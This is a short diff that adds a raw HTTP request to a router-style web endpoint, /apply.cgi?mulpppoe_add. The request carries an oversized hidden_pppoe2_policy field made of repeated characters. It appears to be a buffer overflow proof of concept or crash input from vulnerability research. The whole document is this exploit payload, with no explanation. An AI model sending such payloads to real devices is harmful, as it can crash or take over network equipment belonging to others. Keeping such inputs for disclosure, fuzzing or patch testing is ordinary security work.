@@ -1,0 +1,6 @@
+POST /apply.cgi?mulpppoe_add HTTP/1.1
+Host: 127
+Content-Type: application/json
+Content-Length: 322
+
+hidden_pppoe2_policy=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&submit_flag=remote&%20timestamp=wzqwzqwzq
